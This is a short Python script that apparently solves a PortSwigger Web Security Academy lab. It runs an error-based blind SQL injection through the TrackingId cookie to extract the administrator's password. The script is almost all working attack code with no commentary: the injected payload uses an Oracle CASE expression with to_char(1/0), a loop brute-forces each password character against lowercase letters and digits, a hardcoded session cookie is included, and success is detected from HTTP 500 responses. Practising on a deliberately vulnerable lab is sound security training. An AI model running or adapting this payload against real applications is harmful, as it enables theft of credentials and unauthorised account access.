import requests
import string

burp0_url = "https://acd81fd71fe64390c05f1d1c001a0037.web-security-academy.net:443/"
burp0_cookies = {"TrackingId": "gC5iZZt95eVzauA4'||(SELECT+CASE+WHEN+SUBSTR(password,1,1)='a'+THEN+to_char(1/0)+ELSE+''+END+FROM+users+WHERE+username+='administrator')+||'", "session": "hWIDdCXEPcxtjbj6tMKalrgZlhB0uGAm"}
burp0_headers = {"Cache-Control": "max-age=0", "Sec-Ch-Ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"102\", \"Google Chrome\";v=\"102\"", "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": "\"macOS\"", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Sec-Fetch-Site": "cross-site", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Referer": "https://portswigger.net/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8", "Connection": "close"}
requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)

#blind sql injection +AND+(SELECT+SUBSTRING(password,2,1)+FROM+users+WHERE+username='administrator')='a
for i in range (20,21):
	for j in string.ascii_lowercase + string.digits: #a to z plus 0 to 9
		response = requests.get(
			'https://acd81fd71fe64390c05f1d1c001a0037.web-security-academy.net',
			cookies={
				"TrackingId":f"gC5iZZt95eVzauA4'||(SELECT+CASE+WHEN+SUBSTR(password,{i},1)='{j}'+THEN+to_char(1/0)+ELSE+''+END+FROM+users+WHERE+username+='administrator')+||'",
				"session":'hWIDdCXEPcxtjbj6tMKalrgZlhB0uGAm'
			})
		if response.status_code == 500:
			if 'Internal Server' in response.text:
				print(f"Hit {i},{j}")
